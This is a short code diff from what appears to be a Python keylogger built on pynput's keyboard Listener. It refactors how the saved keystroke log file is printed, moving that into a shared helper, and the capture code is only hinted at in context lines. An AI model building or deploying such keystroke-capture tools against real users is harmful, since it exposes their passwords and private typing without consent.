@@ -1,6 +1,7 @@
 #!/bin/python3.10
 
 from pynput.keyboard import Key, Listener
+from common import printFile
 
 from helpKey import translateKey
 
@@ -24,9 +25,7 @@ def saveInFile(key):
 
 
 def readLogs():
-    file = open(KEYLOG_FILE, "r")
-    for line in file:
-        print(line)
+    printFile(KEYLOG_FILE)
 
 
 def escapeKeys(key):
